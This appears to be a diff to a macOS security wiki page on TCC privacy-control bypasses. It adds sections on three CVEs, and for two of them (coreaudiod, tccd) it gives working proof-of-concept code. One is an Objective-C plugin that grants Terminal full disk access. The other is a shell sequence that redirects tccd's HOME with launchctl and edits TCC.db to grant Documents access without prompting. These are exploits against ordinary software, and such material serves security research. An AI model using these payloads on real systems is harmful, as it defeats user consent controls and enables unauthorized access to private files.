@@ -39,8 +39,6 @@ The **notification center UI** can make **changes in the system TCC database**:
 ```bash
 codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
 [..]
-com.apple.private.security.storage.TCC
-com.apple.private.tcc.allow
 com.apple.private.tcc.manager
 com.apple.rootless.storage.TCC
 ```
@@ -191,11 +189,85 @@ Electron is working on **`ElectronAsarIntegrity`** key in Info.plist that will c
 
 ### Code Injection Bypass
 
-I you manage to **inject code in a process** you will be able to abuse the TCC permissions of that process.
+I you manage to **inject code in a process** you will be able to abuse the TCC permissions of that process. See some examples in the following sections:
+
+### CVE-2020-29621 - Coreaudiod
+
+The binary **`/usr/sbin/coreaudiod`** had the entitlements `com.apple.security.cs.disable-library-validation` and `com.apple.private.tcc.manager`. The first **allowing code injection** and second one giving it access to **manage TCC**.
+
+This binary allowed to load **third party plug-ins** from the folder `/Library/Audio/Plug-Ins/HAL`. Therefore, it was possible to **load a plugin and abuse the TCC permissions** with this PoC:
+
+```objectivec
+#import <Foundation/Foundation.h>
+#import <Security/Security.h>
+
+extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);
+
+void add_tcc_entry() {
+    CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");
+    
+    CFStringRef bundleID = CFSTR("com.apple.Terminal");
+    CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
+    SecRequirementRef requirement = NULL;
+    SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
+    CFDataRef requirementData = NULL;
+    SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);
+    
+    TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
+}
+
+__attribute__((constructor)) static void constructor(int argc, const char **argv) {
+    
+    add_tcc_entry();
+    
+    NSLog(@"[+] Exploitation finished...");
+    exit(0);
+```
+
+### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>
+
+The userland **tccd daemon** what using the **`HOME`** **env** variable to access the TCC users database from: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**
+
+According to [this Stack Exchange post](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) and because the TCC daemon is running via `launchd` within the current user’s domain, it's possible to **control all environment variables** passed to it.\
+Thus, an **attacker could set `$HOME` environment** variable in **`launchctl`** to point to a **controlled** **directory**, **restart** the **TCC** daemon, and then **directly modify the TCC database** to give itself **every TCC entitlement available** without ever prompting the end user.\
+PoC:
+
+```bash
+# reset database just in case (no cheating!)
+$> tccutil reset All
+# mimic TCC's directory structure from ~/Library
+$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
+# cd into the new directory
+$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"                     
+# set launchd $HOME to this temporary directory
+$> launchctl setenv HOME /tmp/tccbypass
+# restart the TCC daemon
+$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
+# print out contents of TCC database and then give Terminal access to Documents
+$> sqlite3 TCC.db .dump                                                               
+$> sqlite3 TCC.db "INSERT INTO access
+                   VALUES('kTCCServiceSystemPolicyDocumentsFolder',
+                   'com.apple.Terminal', 0, 1, 1,
+X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
+                   NULL,
+                   NULL,
+                   'UNUSED',
+                   NULL,
+                   NULL,
+                   1333333333333337);"
+# list Documents directory without prompting the end user
+$> ls ~/Documents
+```
+
+### CVE-2023-26818 - Telegram
+
+Telegram had the entitlements `com.apple.security.cs.allow-dyld-environment-variables` and c`om.apple.security.cs.disable-library-validation`, so it was possible to abuse it to **get access to its permissions** such recording with the camera. You can [**find the payload in the writeup**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).
 
 ## References
 
 * [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
+* [**https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
+* [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
 
 <details>
 
